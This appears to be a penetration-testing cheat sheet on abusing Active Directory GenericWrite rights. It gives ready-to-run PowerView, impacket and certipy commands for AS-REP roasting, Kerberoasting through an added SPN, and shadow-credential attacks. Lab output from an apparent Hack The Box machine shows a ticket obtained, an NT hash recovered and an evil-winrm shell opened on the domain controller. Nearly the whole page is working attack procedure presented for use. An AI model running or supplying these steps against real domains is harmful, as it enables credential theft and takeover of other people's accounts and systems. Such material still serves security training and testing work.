---
title: "GenericWrite"
date: 2024-7-13
tags: ["Shadow Credentials", "Pass-The-Ticket", "Kerberoasting", "Genericwrite", "Powerview", "Asreproast", "Credential Dumping", "Ticket Granting Ticket", "Active Directory", "Windows"]
---

### Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit to target user

{{< tab set1 tab1 active >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Import PowerView

```console
. .\PowerView.ps1
```

#### 2. Check target user

```console
Get-DomainUser <TARGET_USER> | ConvertFrom-UACValue
```

#### 3. Add UF_DONT_REQUIRE_PREAUTH bit

```console
Set-DomainObject -Identity <TARGET_USER> -XOR @{useraccountcontrol=4194304} -Verbose
```

#### 4. AS-REP Roasting

```console
# In local linux machine
impacket-GetNPUsers '<DOMAIN>/<USER>' -no-pass -dc-ip <DC>
```

{{< /tabcontent >}}

---

### Abuse #2 : Kerberoasting by adding spn

{{< tab set2 tab1 active >}}Windows{{< /tab >}}
{{< tabcontent set2 tab1 >}}

#### 1. Import PowerView

```console
. .\PowerView.ps1
```

#### 2. Create a cred object (runas) \[optional\]

```console
$username = '<DOMAIN>\<USER>'
```

```console
$password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force
```

```console
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
```

#### 3. Add a SPN

```console
# eg. MSSQLSvc/example.com:1433
setspn -a '<SERVICE>/<TARGET_DOMAIN>:<SERVICE_PORT>' '<DOMAIN>\<TARGET_USER>'
```

```console
# Check
Get-DomainUser '<TARGET_USER>' | Select serviceprincipalname
```

#### 4. Get SPN

```console
Get-DomainSPNTicket -SPN '<SERVICE>/<TARGET_DOMAIN>:<SERVICE_PORT>' -Credential $Cred
```

{{< /tabcontent >}}

---

### Abuse #3: Add shadow credentials

{{< tab set3 tab1 active >}}Linux{{< /tab >}}
{{< tabcontent set3 tab1 >}}

#### 1. Request a ticket

```console
sudo ntpdate -s <DC> && impacket-getTGT '<DOMAIN>/<USER>'
```

```console {class="sample-code"}
$ sudo ntpdate -s dc.absolute.htb && impacket-getTGT 'absolute.htb/m.lovegod'
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Saving ticket in m.lovegod.ccache
```

#### 2. Add shadow credentials

```console
export KRB5CCNAME=<USER>.ccache
```

```console {class="sample-code"}
$ export KRB5CCNAME=m.lovegod.ccache
```

```console
# Pre-check (Optional)
certipy-ad find -username '<USER>@<DOMAIN>' -k -target <TARGET_DOMAIN>
```

```console {class="sample-code"}
$ certipy-ad find -username 'm.lovegod@absolute.htb' -k -target dc.absolute.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'absolute-DC-CA' via CSRA
[!] Got error while trying to get CA configuration for 'absolute-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'absolute-DC-CA' via RRP
[*] Got CA configuration for 'absolute-DC-CA'
[*] Saved BloodHound data to '20240924045839_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20240924045839_Certipy.txt'
[*] Saved JSON output to '20240924045839_Certipy.json'
```

```console
# Add shadow credentials
certipy-ad shadow auto -username '<USER>@<DOMAIN>' -account <TARGET_USER> -k -target <TARGET_DOMAIN>
```

```console {class="sample-code"}
$ certipy-ad shadow auto -username 'm.lovegod@absolute.htb' -account winrm_user -k -target dc.absolute.htb       
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_user'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '8b5c2efa-83aa-4f27-d9c7-bc95a9eb1fee'
[*] Adding Key Credential with device ID '8b5c2efa-83aa-4f27-d9c7-bc95a9eb1fee' to the Key Credentials for 'winrm_user'
[*] Successfully added Key Credential with device ID '8b5c2efa-83aa-4f27-d9c7-bc95a9eb1fee' to the Key Credentials for 'winrm_user'
[*] Authenticating as 'winrm_user' with the certificate
[*] Using principal: winrm_user@absolute.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'winrm_user.ccache'
[*] Trying to retrieve NT hash for 'winrm_user'
[*] Restoring the old Key Credentials for 'winrm_user'
[*] Successfully restored the old Key Credentials for 'winrm_user'
[*] NT hash for 'winrm_user': 8738c7413a5da3bc1d083efc0ab06cb2
```

#### FIX: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)

```console
# No really a fix, need to runas administrator
gpupdate /force
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\Administrator\Documents> gpupdate /force
Updating policy...

Computer Policy update has completed successfully.

User Policy update has completed successfully.
```

#### 3. Remote

```console
# Edit '/etc/krb5.conf' (All uppercase)
[libdefaults]
    default_realm = <DOMAIN>

[realms]
    <DOMAIN> = {
        kdc = <DC>:88
        admin_server = <DC>
        default_domain = <DOMAIN>
    }
    
[domain_realm]
    .domain.internal = <DOMAIN>
    domain.internal = <DOMAIN>
```

```console {class="sample-code"}
[libdefaults]
    default_realm = ABSOLUTE.HTB

[realms]
    ABSOLUTE.HTB = {
        kdc = DC.ABSOLUTE.HTB:88
        admin_server = DC.ABSOLUTE.HTB
        default_domain = ABSOLUTE.HTB
    }
    
[domain_realm]
    .domain.internal = ABSOLUTE.HTB
    domain.internal = ABSOLUTE.HTB
```

<br>

```console
export KRB5CCNAME=<TARGET_USER>.ccache
```

```console {class="sample-code"}
$ export KRB5CCNAME=winrm_user.ccache
```

```console
evil-winrm -i <TARGET_DOMAIN> -r <DOMAIN>
```

```console {class="sample-code"}
$ evil-winrm -i dc.absolute.htb -r absolute.htb
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_user\Documents> 
```

{{< /tabcontent >}}
